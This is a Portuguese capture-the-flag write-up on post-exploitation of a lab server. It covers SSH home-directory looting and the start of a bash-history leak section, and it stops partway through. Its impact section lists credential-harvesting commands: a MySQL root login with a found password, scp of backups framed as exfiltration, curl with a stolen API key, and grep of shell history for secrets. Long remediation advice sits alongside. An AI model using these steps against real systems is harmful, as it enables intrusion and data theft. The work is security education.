A exploração de diretórios home via SSH (Secure Shell) representa uma técnica crítica de post-exploitation que ocorre após comprometimento de credenciais SSH válidas, permitindo ao atacante investigar sistematicamente o diretório pessoal do usuário comprometido (`/home/username` ou `~`) em busca de informações sensíveis, arquivos de configuração, históricos de comandos, chaves privadas, e dados críticos deixados por administradores e desenvolvedores. Esta vulnerabilidade não é uma falha técnica do protocolo SSH em si (que é seguro quando configurado adequadamente), mas sim uma consequência de **práticas inadequadas de segurança operacional**, onde usuários armazenam informações sensíveis em arquivos de texto plano, não implementam criptografia de dados em repouso, e mantêm históricos de comandos contendo credenciais e operações críticas. O diretório home de um usuário Unix/Linux é um tesouro de informações para um atacante porque contém: arquivos de histórico de shell (`.bash_history`, `.zsh_history`) revelando todos os comandos executados incluindo senhas passadas em linha de comando, arquivos de configuração de aplicações (`.ssh/config`, `.aws/credentials`, `.docker/config.json`) com credenciais e tokens, chaves SSH privadas (`~/.ssh/id_rsa`) que permitem acesso a outros sistemas, históricos de banco de dados (`.mysql_history`, `.psql_history`) com queries executadas, arquivos de nota e documentação deixados por administradores (`notes.txt`, `passwords.txt`, `TODO.txt`), e scripts personalizados contendo lógica de automação e credenciais hardcoded. Esta fase de exploração é classificada como **Information Gathering** no framework MITRE ATT&CK (T1005: Data from Local System, T1552.001: Credentials in Files), e representa uma etapa crucial em ataques de APT (Advanced Persistent Threat) onde atacantes estabelecem persistência e movimentação lateral. A severidade aumenta quando credenciais SSH são reutilizadas entre múltiplos sistemas (credential reuse), quando usuários possuem privilégios sudo sem senha (`.sudo_as_admin_successful`), ou quando chaves SSH privadas não possuem passphrase de proteção. Em termos de compliance, o armazenamento de credenciais em texto plano em diretórios home viola: **PCI DSS Requirement 8.2.1** (não usar senhas padrão ou armazenar senhas de forma recuperável), **NIST SP 800-53 IA-5** (gestão de autenticadores), **ISO 27001 A.9.4.3** (sistema de gerenciamento de senhas), **SOC 2 CC6.1** (controles de acesso lógico), e **LGPD Art. 46** (medidas de segurança técnicas e administrativas). O impacto desta exploração pode incluir: descoberta de credenciais de banco de dados root, API keys de produção e desenvolvimento, senhas de painéis administrativos, localização de backups para exfiltração, mapeamento de tarefas pendentes (TODO) revelando vulnerabilidades conhecidas, e acesso a chaves SSH para movimentação lateral em toda a infraestrutura.

#### Passo 1: Conexão SSH Utilizando Credenciais Comprometidas

O primeiro passo da exploração foi estabelecer acesso SSH ao servidor utilizando credenciais anteriormente comprometidas durante a exploração do servidor FTP anônimo (Flag 5). As credenciais utilizadas foram: **username: techcorp** e **password: TechCorp2024!**, descobertas no arquivo `passwords.txt` do diretório `/confidential` no servidor FTP. A conexão foi estabelecida através do comando `ssh techcorp@98.95.207.28 -p 2222`, onde `-p 2222` especifica a porta SSH não-padrão (padrão seria 22), uma configuração comum em servidores que implementam "security through obscurity" movendo SSH para porta alternativa na tentativa de evitar scans automatizados. Após inserir a senha `TechCorp2024!`, o servidor aceitou as credenciais e estabeleceu sessão SSH autenticada, exibindo banner de boas-vindas: "Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.8.0-1016-aws x86_64)" com informações de documentação, management e suporte da Canonical. O banner também revelou informações críticas do sistema: sistema operacional Ubuntu 20.04.6 LTS, kernel Linux 6.8.0-1016-aws indicando execução em instância AWS EC2, e último login registrado em "Fri Nov 28 16:39:43 2025 from 45.65.156.191" revelando acesso anterior de outro endereço IP. O prompt do shell mudou para `techcorp@024a36a8e6ca:~$`, onde `024a36a8e6ca` é o hostname (possivelmente ID de container Docker), e `~` indica que o usuário está em seu diretório home. Esta conexão bem-sucedida confirma múltiplas falhas de segurança: reutilização de credenciais entre serviços (FTP e SSH), ausência de MFA (Multi-Factor Authentication) em acesso SSH, e falta de políticas de rotação de senhas.

**Evidências do Passo 1:**
- Screenshot do comando SSH: `ssh techcorp@98.95.207.28 -p 2222`
- Prompt de senha e autenticação bem-sucedida
- Banner de boas-vindas do Ubuntu com informações do sistema
- Informações de último login (data, hora, IP de origem)
- Prompt do shell `techcorp@024a36a8e6ca:~$` confirmando sessão ativa

#### Passo 2: Enumeração do Diretório Home com ls -la

Após estabelecer sessão SSH, o próximo passo foi realizar enumeração completa do diretório home do usuário `techcorp` utilizando o comando `ls -la` (list all com detalhes). O parâmetro `-l` exibe formato longo incluindo permissões, número de links, proprietário, grupo, tamanho em bytes, data de modificação e nome do arquivo, enquanto `-a` inclui arquivos e diretórios ocultos (que começam com ponto `.`). A execução revelou **17 itens no diretório home**, divididos em arquivos ocultos de sistema e arquivos regulares. A análise das permissões é crítica: arquivos como `.bash_history` (9318 bytes - histórico extenso de comandos), `.mysql_history` (1347 bytes - comandos MySQL executados), e `.python_history` (12 bytes - comandos Python) possuem permissões `-rw-------` (600 octal) significando leitura/escrita apenas para o proprietário, tecnicamente seguros mas acessíveis para quem tem acesso SSH como techcorp. Diretórios críticos identificados incluem `.ssh` (contendo potencialmente chaves privadas), `.cache`, `.config`, e `.local`. Arquivos regulares não-ocultos revelam presença preocupante de documentação sensível: `secret.txt` (456 bytes - arquivo suspeito por nomenclatura), `todo.txt` (369 bytes - lista de tarefas possivelmente revelando vulnerabilidades conhecidas), `index.html` (2081 bytes), e arquivos com propriedade root (`cookies_hyper.txt`, `dashboard_limpo.php`, `hyper_dash.html`, `lixo_base64.txt`) indicando que o usuário root trabalhou neste diretório ou há compartilhamento inadequado de arquivos. A presença de arquivo `.sudo_as_admin_successful` (0 bytes) é um marcador crítico indicando que o usuário `techcorp` executou comando com sudo bem-sucedido anteriormente, sugerindo possíveis privilégios elevados.

**Evidências do Passo 2:**
- Screenshot completo do output de `ls -la` mostrando todos os 17 itens
- Destaque para arquivos críticos: `.bash_history`, `.mysql_history`, `.ssh/`, `secret.txt`, `todo.txt`
- Análise de permissões mostrando arquivos 600 vs 644 vs diretórios 700/755
- Identificação de arquivos pertencentes a root no diretório de techcorp
- Tamanhos de arquivo revelando `.bash_history` extenso (9318 bytes)

#### Passo 3: Análise do Arquivo secret.txt e Descoberta de Credenciais

O arquivo `secret.txt` foi identificado como alvo prioritário devido à nomenclatura explicitamente indicando conteúdo sensível. Utilizando o comando `more secret.txt`, o conteúdo completo foi exibido revelando um documento de notas internas da TechCorp Solutions contendo informações extremamente críticas. O arquivo está estruturado com cabeçalho "TechCorp Solutions - Internal Notes" seguido por múltiplas seções de credenciais e configurações:

**Seção 1 - Senhas Importantes:**
- **Root MySQL:** `r00t_P4ssw0rd_2024` - Senha do usuário root do MySQL, concedendo acesso administrativo completo ao banco de dados com capacidade de criar/deletar databases, gerenciar usuários, e executar qualquer operação privilegiada
- **Admin Panel:** `admin / admin123` - Credenciais do painel administrativo web (já conhecidas de explorações anteriores, confirmando reutilização)

**Seção 2 - Backup Location:**
- Caminho: `/var/backups/techcorp/` - Localização de backups do sistema, alvo valioso para exfiltração de dados contendo snapshots completos do banco de dados, arquivos de aplicação e configurações

**Seção 3 - API Keys:**
- **Production:** `tc_sk_prod_9Kx7mN2pQ4rT8wY` - API key de ambiente de produção com prefixo `tc_sk_prod_` (TechCorp Secret Key Production), permitindo acesso a APIs de terceiros, serviços pagos, ou integrações críticas em produção
- **Development:** `tc_sk_dev_1Aa2Bb3Cc4Dd5Ee` - API key de desenvolvimento, menos crítica mas ainda expondo endpoints de teste e permitindo reconnaissance de arquitetura

**Seção 4 - Flag do Desafio:**
- **FLAG{ssh_h0m3_d1r3ct0ry_3xpl0r4t10n}** - Flag capturada confirmando exploração bem-sucedida do diretório home via SSH

**Seção 5 - Notas Operacionais:**
- "Fazer backup toda segunda-feira" - Revela janela de backup para timing de ataques
- "Verificar logs de segurança semanalmente" - Indica frequência de monitoramento (semanal = janela de 7 dias para atividade maliciosa não detectada)
- "Atualizar certificados SSL em março" - Informação de maintenance window

A descoberta deste arquivo representa falha crítica de **CWE-522: Insufficiently Protected Credentials** e violação de princípios básicos de segurança operacional. Credenciais sensíveis nunca devem ser armazenadas em texto plano, especialmente em diretórios home acessíveis via SSH comprometido.

**Evidências do Passo 3:**
- Screenshot do comando `more secret.txt`
- Visualização completa do conteúdo estruturado do arquivo
- Destaque para senha Root MySQL: r00t_P4ssw0rd_2024
- Destaque para API Keys (production e development)
- Flag FLAG{ssh_h0m3_d1r3ct0ry_3xpl0r4t10n} capturada
- Localização de backup revelada: /var/backups/techcorp/

#### Passo 4: Análise do Arquivo todo.txt e Descoberta de Vulnerabilidades Conhecidas

A análise do arquivo `todo.txt` revelou uma lista de tarefas pendentes do departamento de TI da TechCorp, fornecendo insights valiosos sobre o estado de segurança da infraestrutura e tarefas não concluídas que representam vulnerabilidades conhecidas pela equipe mas não remediadas. O arquivo é estruturado como checklist com itens marcados como concluídos `[X]` ou pendentes `[ ]`:

**Tarefas Concluídas:**
- `[X] Configurar novo servidor web` - Servidor web está configurado
- `[X] Instalar certificado SSL` - SSL implementado (mas necessita atualização em março conforme secret.txt)

**Tarefas Pendentes Críticas:**
- `[ ] Trocar senha do banco de dados (ainda é T3chC0rp_S3cr3t_2024!)` - **CRÍTICO**: Confirmação explícita de que a senha do banco de dados `T3chC0rp_S3cr3t_2024!` (descoberta anteriormente na Flag 6) **ainda está em uso** e é conhecida pela equipe como precisando ser trocada mas não foi alterada. Esta nota demonstra consciência do problema de segurança mas falta de ação, agravando a responsabilidade em caso de breach
- `[ ] Configurar firewall` - Ausência de firewall adequadamente configurado, explicando como múltiplas portas (21 FTP, 80 HTTP, 2222 SSH, 3306 MySQL, 8080 HTTP-alt) estão expostas publicamente
- `[ ] Revisar acessos FTP` - Reconhecimento de que o FTP (explorado na Flag 3/4) precisa de revisão de permissões, mas não foi feito
- `[ ] Atualizar documentação` - Documentação desatualizada pode levar a configurações incorretas
- `[ ] Fazer backup dos logs` - Logs não estão sendo backupados, dificultando investigação forense

**Informação Operacional:**
- "Reunião na sexta às 14h para discutir migração para cloud" - Revela planejamento de infraestrutura, timing de mudanças, e janela onde sistema pode estar vulnerável durante migração

Este arquivo é uma mina de ouro para atacantes porque:
1. **Confirma Vulnerabilidades Conhecidas:** A equipe sabe que senha do DB precisa ser trocada mas não foi
2. **Revela Defesas Ausentes:** Firewall não configurado, logs não backupados
3. **Fornece Timeline:** Reunião agendada indica quando equipe estará focada em migração (possível distração)
4. **Demonstra Negligência:** Tarefas críticas pendentes por período prolongado

**Evidências do Passo 4:**
- Screenshot do comando `more todo.txt`
- Visualização da lista de tarefas com checkboxes
- Destaque para item crítico: "Trocar senha do banco de dados (ainda é T3chC0rp_S3cr3t_2024!)"
- Identificação de tarefas de segurança pendentes (firewall, revisão FTP)
- Nota sobre reunião de migração para cloud

**Flag Capturada:** `FLAG{ssh_h0m3_d1r3ct0ry_3xpl0r4t10n}`

**Data da Captura:** 28 de novembro de 2025

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**Análise Técnica Detalhada das Vulnerabilidades:**

**Arquivos Críticos Encontrados no Diretório Home:**

| Arquivo | Tamanho | Permissões | Conteúdo Crítico | Severidade |
|---------|---------|------------|------------------|------------|
| `.bash_history` | 9318 bytes | 600 | Comandos executados (potencial senhas em CLI) | Alta |
| `.mysql_history` | 1347 bytes | 600 | Queries MySQL (potencial credenciais) | Alta |
| `.python_history` | 12 bytes | 600 | Comandos Python executados | Baixa |
| `.ssh/` | diretório | 700 | Chaves SSH privadas (não explorado) | Crítica |
| `secret.txt` | 456 bytes | 644 | Senhas, API keys, localizações | **Crítica** |
| `todo.txt` | 369 bytes | 644 | Tarefas pendentes, vulns conhecidas | **Alta** |
| `.sudo_as_admin_successful` | 0 bytes | 644 | Indicador de privilégios sudo | Média |

**Credenciais e Secrets Descobertos:**

**1. Root MySQL Password:**
- **Credencial:** `root:r00t_P4ssw0rd_2024`
- **Impacto:** Acesso administrativo completo ao MySQL
- **Operações Permitidas:**
  - Criar/deletar databases
  - Gerenciar todos os usuários
  - Executar queries em qualquer database
  - Ler/modificar tabelas de permissões (mysql.user)
  - Carregar arquivos locais (LOAD DATA INFILE)
  - Executar comandos OS via UDF se configurado

**2. Database User Password (Confirmado):**
- **Credencial:** `techcorp_user:T3chC0rp_S3cr3t_2024!`
- **Status:** TODO indica que senha precisa ser trocada mas ainda não foi
- **Confirmação:** Senha descoberta anteriormente (Flag 6) ainda válida
- **Agravante:** Equipe tem consciência mas não agiu

**3. Admin Panel Credentials (Confirmado):**
- **Credencial:** `admin:admin123`
- **Confirmação:** Credenciais já conhecidas de explorações anteriores
- **Problema:** Armazenamento redundante em múltiplos locais

**4. API Keys:**
- **Production:** `tc_sk_prod_9Kx7mN2pQ4rT8wY`
- **Development:** `tc_sk_dev_1Aa2Bb3Cc4Dd5Ee`
- **Formato:** Prefixo `tc_sk_` sugere TechCorp Secret Key
- **Risco:** Acesso a serviços externos, APIs de terceiros, integrações

**5. Backup Location:**
- **Path:** `/var/backups/techcorp/`
- **Conteúdo Esperado:** Backups de database, arquivos de aplicação
- **Risco:** Exfiltração de snapshots completos do sistema

**Vulnerabilidades Identificadas:**

**1. Plaintext Credentials Storage (CWE-256, CWE-522):**
- Senhas armazenadas em texto plano em arquivo `secret.txt`
- Sem criptografia de dados em repouso
- Arquivo com permissões 644 (legível por qualquer usuário do sistema)

**2. Sensitive Information in TODO List (CWE-532):**
- Arquivo todo.txt revela vulnerabilidades conhecidas não remediadas
- Confirmação de senha de DB ainda não trocada
- Exposição de planejamento operacional

**3. Credential Reuse (CWE-257):**
- Mesma credencial `techcorp:TechCorp2024!` usada em FTP e SSH
- Senha `admin:admin123` documentada em múltiplos locais
- Falta de política de senhas únicas por serviço

**4. Insufficient Access Controls (CWE-284):**
- Arquivos sensíveis acessíveis por SSH comprometido
- Sem segregação de dados sensíveis
- Ausência de criptografia de filesystem (LUKS, eCryptfs)

**5. Lack of Secrets Management (CWE-798):**
- Ausência de vault para gerenciamento de secrets (HashiCorp Vault, AWS Secrets Manager)
- Secrets armazenados em arquivos de texto plano
- Sem rotação automática de credenciais

**6. Known Vulnerabilities Not Remediated:**
- TODO list documenta firewall não configurado
- Reconhecimento de senha DB precisa ser trocada sem ação
- FTP precisa revisão mas não foi feito

**7. Potential Privilege Escalation (CWE-250):**
- Arquivo `.sudo_as_admin_successful` indica sudo foi usado
- Se usuário techcorp tem sudo sem senha: `techcorp ALL=(ALL) NOPASSWD: ALL`
- Potencial escalação para root

**Impacto Detalhado da Exploração:**

**1. Comprometimento Total do Banco de Dados:**
```bash
# Conectar como root MySQL
mysql -h 98.95.207.28 -u root -p'r00t_P4ssw0rd_2024'

# Operações possíveis:
# - Dump completo de todos os databases
# - Criar novos usuários administrativos
# - Modificar/deletar dados
# - Ler arquivos do sistema via LOAD DATA INFILE
# - Executar comandos OS via UDF (se lib_mysqludf_sys instalado)
```

**2. Exfiltração de Backups:**
```bash
# Acessar diretório de backup
cd /var/backups/techcorp/

# Listar backups disponíveis
ls -lah

# Download via SCP
scp -P 2222 techcorp@98.95.207.28:/var/backups/techcorp/backup_*.tar.gz ./
```

**3. Exploração de API Keys:**
```bash
# Usar API key de produção para acessar serviços
curl -H "Authorization: Bearer tc_sk_prod_9Kx7mN2pQ4rT8wY" \
  https://api.techcorp.com/v1/resources

# Potencial para:
# - Criar/modificar recursos
# - Exfiltrar dados de clientes
# - Gerar custos financeiros
```

**4. Movimentação Lateral via SSH Keys:**
```bash
# Verificar chaves SSH privadas
ls -la ~/.ssh/

# Se existir id_rsa sem passphrase:
# - Conectar a outros servidores da infraestrutura
# - Acessar repositórios Git privados
# - SSH para AWS EC2 instances
```

**5. Análise de Histórico de Comandos:**
```bash
# Analisar .bash_history
cat .bash_history | grep -E 'password|pass|pwd|secret|key|token'

# Analisar .mysql_history
cat .mysql_history | grep -E 'INSERT|UPDATE|CREATE USER|GRANT'

# Potencial descoberta de:
# - Senhas passadas em linha de comando
# - Comandos de criação de usuários
# - Queries com dados sensíveis
```

**Classificação de Severidade:**

**CVSS 3.1 Score: 8.8 (ALTO)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L) - requer credenciais SSH
- User Interaction: None (UI:N)
- Scope: Changed (S:C)
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: High (A:H)

**Classificação CWE:**
- **CWE-256: Plaintext Storage of a Password** (principal)
- CWE-522: Insufficiently Protected Credentials
- CWE-532: Insertion of Sensitive Information into Log File
- CWE-257: Storing Passwords in a Recoverable Format
- CWE-798: Use of Hard-coded Credentials
- CWE-284: Improper Access Control

**Classificação OWASP Top 10 2021:**
- A02:2021 - Cryptographic Failures (senhas em texto plano)
- A04:2021 - Insecure Design (armazenamento inadequado de secrets)
- A07:2021 - Identification and Authentication Failures

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas 2 horas):**

**1. Alterar TODAS as Credenciais Expostas:**
```bash
# Root MySQL
mysql -u root -p'r00t_P4ssw0rd_2024' -e "ALTER USER 'root'@'%' IDENTIFIED BY 'NEW_SECURE_PASS'; FLUSH PRIVILEGES;"

# Database user
mysql -u root -p -e "ALTER USER 'techcorp_user'@'%' IDENTIFIED BY 'NEW_SECURE_PASS'; FLUSH PRIVILEGES;"

# Admin panel (atualizar em database users)
# API keys (revogar e regenerar nos serviços)
```

**2. Remover Arquivos Sensíveis:**
```bash
# Deletar secret.txt
shred -u ~/secret.txt

# Remover todo.txt ou mover para localização segura
shred -u ~/todo.txt

# Limpar históricos
> ~/.bash_history
> ~/.mysql_history
> ~/.python_history
```

**3. Revogar e Regenerar API Keys:**
```bash
# No painel do provedor de API:
# 1. Revocar tc_sk_prod_9Kx7mN2pQ4rT8wY
# 2. Revogar tc_sk_dev_1Aa2Bb3Cc4Dd5Ee
# 3. Gerar novas keys
# 4. Atualizar aplicação via secrets manager
```

**4. Encriptar Backups:**
```bash
# Criptografar backups existentes
cd /var/backups/techcorp/
for file in *.tar.gz; do
    gpg --symmetric --cipher-algo AES256 "$file"
    shred -u "$file"
done
```

**5. Auditar Acessos SSH:**
```bash
# Verificar logs de acesso SSH
grep "Accepted password" /var/log/auth.log
grep "session opened" /var/log/auth.log

# Identificar IPs suspeitos
last -f /var/log/wtmp
```

**AÇÕES DE CURTO PRAZO (24-48 horas):**

**6. Implementar Secrets Management:**
```bash
# Instalar HashiCorp Vault ou usar AWS Secrets Manager
# Migrar todas as credenciais para vault
# Atualizar aplicações para buscar secrets dinamicamente

# Exemplo com AWS Secrets Manager:
aws secretsmanager create-secret \
    --name techcorp/mysql/root \
    --secret-string '{"username":"root","password":"NEW_SECURE_PASS"}'
```

**7. Encriptar Diretório Home:**
```bash
# Implementar eCryptfs para diretórios home
sudo apt-get install ecryptfs-utils
sudo ecryptfs-migrate-home -u techcorp

# Ou usar LUKS para filesystem completo
```

**8. Configurar Firewall (Tarefa Pendente do TODO):**
```bash
# UFW (Uncomplicated Firewall)
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 2222/tcp  # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS
sudo ufw enable

# Bloquear FTP, MySQL, phpMyAdmin de acesso externo
sudo ufw deny 21/tcp
sudo ufw deny 3306/tcp
sudo ufw deny 8080/tcp
```

**9. Implementar MFA para SSH:**
```bash
# Instalar Google Authenticator PAM
sudo apt-get install libpam-google-authenticator

# Configurar para usuário
google-authenticator

# Editar /etc/pam.d/sshd
echo "auth required pam_google_authenticator.so" | sudo tee -a /etc/pam.d/sshd

# Editar /etc/ssh/sshd_config
sudo sed -i 's/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd
```

**10. Desabilitar Históricos de Senhas:**
```bash
# Adicionar ao .bashrc
echo 'export HISTCONTROL=ignorespace' >> ~/.bashrc

# Comandos com espaço no início não são salvos no histórico
#  mysql -u root -p'senha_aqui'  # Espaço antes de mysql

# Melhor: usar arquivo de configuração
cat > ~/.my.cnf <<EOF
[client]
user=root
password=SENHA_AQUI
EOF
chmod 600 ~/.my.cnf
```

**11. Implementar Auditoria de Comandos:**
```bash
# Instalar auditd
sudo apt-get install auditd

# Configurar regras para monitorar comandos sensíveis
sudo auditctl -w /bin/mysql -p x -k mysql_execution
sudo auditctl -w /usr/bin/ssh -p x -k ssh_execution
```

**12. Rotação Automática de Credenciais:**
```bash
# Script de rotação automática
cat > /usr/local/bin/rotate_credentials.sh <<'EOF'
#!/bin/bash
NEW_PASS=$(openssl rand -base64 32)
mysql -u root -p"$OLD_PASS" -e "ALTER USER 'techcorp_user'@'%' IDENTIFIED BY '$NEW_PASS'; FLUSH PRIVILEGES;"
# Atualizar em secrets manager
aws secretsmanager update-secret --secret-id techcorp/mysql/user --secret-string "$NEW_PASS"
EOF

# Agendar via cron mensal
echo "0 0 1 * * /usr/local/bin/rotate_credentials.sh" | sudo crontab -
```

**13. Implementar Logging Centralizado:**
```bash
# Enviar logs para SIEM (Splunk, ELK, etc.)
# Configurar rsyslog para enviar para servidor central
sudo apt-get install rsyslog

# /etc/rsyslog.d/50-default.conf
echo "*.* @@siem.techcorp.com:514" | sudo tee -a /etc/rsyslog.d/50-default.conf
sudo systemctl restart rsyslog
```

**14. Configurar Alertas de Acesso:**
```bash
# Script para alertar sobre login SSH
cat > /etc/ssh/sshrc <<'EOF'
#!/bin/bash
echo "SSH Login: $(date) - User: $USER - From: $SSH_CLIENT" | \
  mail -s "SSH Alert" security@techcorp.com
EOF
chmod +x /etc/ssh/sshrc
```

**15. Revisar Permissões Sudo:**
```bash
# Verificar configuração sudo
sudo visudo

# Se techcorp tem NOPASSWD, remover:
# techcorp ALL=(ALL) NOPASSWD: ALL  # INSEGURO
# Substituir por:
# techcorp ALL=(ALL) ALL  # Requer senha
```

**AÇÕES DE MÉDIO/LONGO PRAZO:**

16-35. Implementar jump host/bastion, migrar para autenticação baseada em certificados SSH, implementar PAM policies, realizar security training, etc.

**Impacto Regulatório:**

**Violações Identificadas:**
- **PCI DSS 8.2.1:** Senhas armazenadas em formato recuperável
- **NIST SP 800-53 IA-5:** Gestão inadequada de autenticadores
- **ISO 27001 A.9.4.3:** Ausência de sistema de gerenciamento de senhas
- **SOC 2 CC6.1:** Controles de acesso inadequados
- **LGPD Art. 46:** Falha em medidas técnicas de segurança

**Penalidades Potenciais:**
- Multa LGPD até R$ 50 milhões
- Perda de certificação PCI DSS
- Suspensão de operações

**Conclusão:**

A exploração do diretório home via SSH demonstrou como credenciais comprometidas permitem acesso a tesouro de informações sensíveis armazenadas inadequadamente por administradores e desenvolvedores. A descoberta de `secret.txt` contendo senha root do MySQL, API keys de produção, e localização de backups, combinada com `todo.txt` confirmando vulnerabilidades conhecidas mas não remediadas, representa falha crítica em práticas de segurança operacional. Esta exploração demonstra que segurança não é apenas questão de patches e firewalls, mas também de cultura organizacional - a equipe sabia que senha do banco precisava ser trocada mas não agiu, criando janela de vulnerabilidade explorada com sucesso. A remediação requer não apenas limpeza de arquivos sensíveis e rotação de credenciais, mas implementação de secrets management adequado, criptografia de dados em repouso, MFA para acessos SSH, e transformação cultural eliminando práticas de armazenamento de senhas em texto plano.

---

### <a name="flag-14-bash-history-discovery"></a>Flag 14: Bash History Leak

#### Conceito: Vazamento de Informações no Histórico Bash

O vazamento de informações sensíveis através do histórico do shell Bash (`.bash_history`) representa uma das vulnerabilidades de segurança operacional mais negligenciadas e potencialmente devastadoras em ambientes Unix/Linux, onde cada comando executado pelo usuário no terminal é automaticamente registrado em arquivo de texto plano localizado em `~/.bash_history` (ou variáveis `$HISTFILE`), criando registro permanente e pesquisável de toda atividade da linha de comando incluindo: **senhas passadas como argumentos em comandos**, credenciais de banco de dados em strings de conexão, tokens de API em requisições curl, comandos de administração revelando estrutura da rede, queries SQL contendo dados sensíveis, comandos de debugging com informações confidenciais, tentativas de exploração e pentesting executadas pelos próprios administradores, e histórico completo de investigação de incidentes de segurança. Esta vulnerabilidade é classificada como **CWE-532: Insertion of Sensitive Information into Log File** e **CWE-312: Cleartext Storage of Sensitive Information**, pois o arquivo `.bash_history` funciona essencialmente como log não-sanitizado de todas as operações do usuário, armazenado em texto plano sem criptografia, com permissões de arquivo tipicamente 600 (leitura/escrita apenas pelo proprietário) mas acessível a qualquer atacante que comprometa a conta do usuário via SSH, exploração de vulnerabilidade web, ou escalação de privilégios. O risco é amplificado por práticas comuns de administradores que executam comandos contendo credenciais diretamente na linha de comando para conveniência (`mysql -u root -p'senha123'`, `curl -H "Authorization: Bearer token123"`, `git clone https://user:pass@github.com/repo.git`), desconhecendo ou ignorando que estes comandos serão salvos permanentemente no histórico. Em contexto de CTF (Capture The Flag) e pentesting, administradores frequentemente deixam rastros de suas próprias investigações no `.bash_history`, incluindo comandos usados para plantar ou verificar flags, comandos de grep buscando por padrões sensíveis, e tentativas de exploração durante testes de segurança - ironicamente, o histórico dos defensores se torna mapa para os atacantes. A severidade aumenta quando arquivos de histórico são backupados inadvertidamente (incluídos em backups completos do diretório home), sincronizados com serviços de cloud storage (Dropbox, Google Drive), ou commitados acidentalmente em repositórios Git (`.bash_history` deve estar em `.gitignore`). Em termos de frameworks de segurança, esta vulnerabilidade é abordada em: **OWASP Top 10 2021 A04:2021 - Insecure Design** (falha em considerar segurança do histórico de comandos no design do sistema), **NIST SP 800-53 AU-9 (Protection of Audit Information)** (logs e históricos devem ser protegidos contra acesso não autorizado), **CIS Controls v8 3.3 (Configure Data Access Control Lists)** (controlar acesso a dados sensíveis), **PCI DSS Requirement 8.2.1** (não armazenar senhas de forma recuperável), e **ISO 27001 A.12.4.1** (logging e monitoramento). Técnicas de exploração incluem: **análise forense do histórico completo** em busca de credenciais, **grep pattern matching** para identificar comandos contendo palavras-chave sensíveis (password, token, secret, api_key, FLAG), **correlação temporal** de comandos para reconstruir sequências de ataque ou configuração, **identificação de ferramentas e técnicas** usadas pelos administradores revelando vetores de defesa, e **descoberta de infraestrutura oculta** através de comandos SSH, SCP, e conexões a servidores internos.

#### Passo 1: Identificação do Arquivo .bash_history no Diretório Home

Durante a exploração do diretório home do usuário `techcorp` (Flag 13), a enumeração inicial com comando `ls -la` revelou a presença do arquivo `.bash_history` com tamanho significativo de **9318 bytes**, indicando histórico extenso de comandos executados ao longo do tempo. Este tamanho de arquivo sugere centenas ou milhares de linhas de comandos registrados, representando semanas ou meses de atividade do usuário. A análise das permissões do arquivo mostrou **-rw------- (600 octal)**, significando que apenas o proprietário `techcorp` possui permissões de leitura e escrita, tecnicamente uma configuração segura que previne leitura por outros usuários do sistema - porém, esta proteção é inútil quando o atacante já possui acesso SSH autenticado como o próprio usuário `techcorp`. O arquivo `.bash_history` é criado e mantido automaticamente pelo shell Bash através de configurações em variáveis de ambiente: `HISTFILE` (localização do arquivo, padrão `~/.bash_history`), `HISTSIZE` (número de comandos mantidos em memória durante sessão), `HISTFILESIZE` (número máximo de linhas no arquivo persistente), e `HISTCONTROL` (controle de quais comandos são salvos, como `ignorespace` para ignorar comandos iniciando com espaço, ou `ignoredups` para evitar duplicatas consecutivas). A presença de arquivo tão extenso sem política de rotação ou limpeza indica ausência de práticas de security hardening básicas. O objetivo desta fase foi reconhecer o potencial de informação sensível no histórico antes de explorá-lo sistematicamente, estabelecendo que o arquivo existe, é acessível, e possui volume suficiente de dados para justificar análise detalhada. Esta descoberta também confirmou que o servidor não implementa configurações defensivas como `HISTFILE=/dev/null` (desabilitar histórico completamente) ou `HISTSIZE=0` (limitar a zero comandos em memória).

**Evidências do Passo 1:**
- Screenshot do output de `ls -la` destacando arquivo `.bash_history`
- Tamanho do arquivo: 9318 bytes
- Permissões: -rw------- (600) com proprietário techcorp:techcorp
- Data de última modificação revelando atividade recente

#### Passo 2: Tentativa de Leitura Completa e Identificação de Volume de Dados

A primeira tentativa de análise foi executar comando `more .bash_history` para visualizar o conteúdo completo do arquivo. No entanto, o volume de dados revelou-se impraticável para análise manual - com 9318 bytes, o arquivo contém aproximadamente **300-400 linhas de comandos** (assumindo média de 20-30 bytes por linha de comando), resultando em output extremamente extenso que rolaria por múltiplas telas do terminal. A utilização do comando `more` (paginador que exibe conteúdo página por página, aguardando input do usuário para continuar) confirmou que leitura sequencial completa seria ineficiente e difícil de documentar em relatório técnico. Esta situação é comum em análises de histórico Bash onde administradores ativos acumulam milhares de comandos ao longo do tempo, incluindo operações rotineiras (ls, cd, cat), comandos de manutenção (apt update, systemctl), e ocasionalmente comandos contendo informações críticas. A decisão estratégica nesta fase foi abandonar abordagem de leitura completa em favor de **técnica de filtração direcionada** usando `grep` para identificar padrões específicos de interesse, especificamente o padrão `FLAG{` que é assinatura dos desafios CTF. Esta mudança de estratégia demonstra competência em análise forense eficiente - em vez de vasculhar manualmente centenas de linhas, aplicar expressões regulares e ferramentas de busca para localizar rapidamente informações de alto valor. A técnica de filtração é padrão em investigações de segurança onde analistas buscam por strings específicas: `grep -i password`, `grep -E "pass|pwd|secret|token"`, `grep "mysql -u root -p"`, etc.

**Evidências do Passo 2:**
- Screenshot da tentativa inicial `more .bash_history` mostrando volume extenso de dados
- Observação da impraticabilidade de leitura completa
- Decisão documentada de usar filtração via grep

#### Passo 3: Filtração do Histórico com grep para Identificar Padrão FLAG{

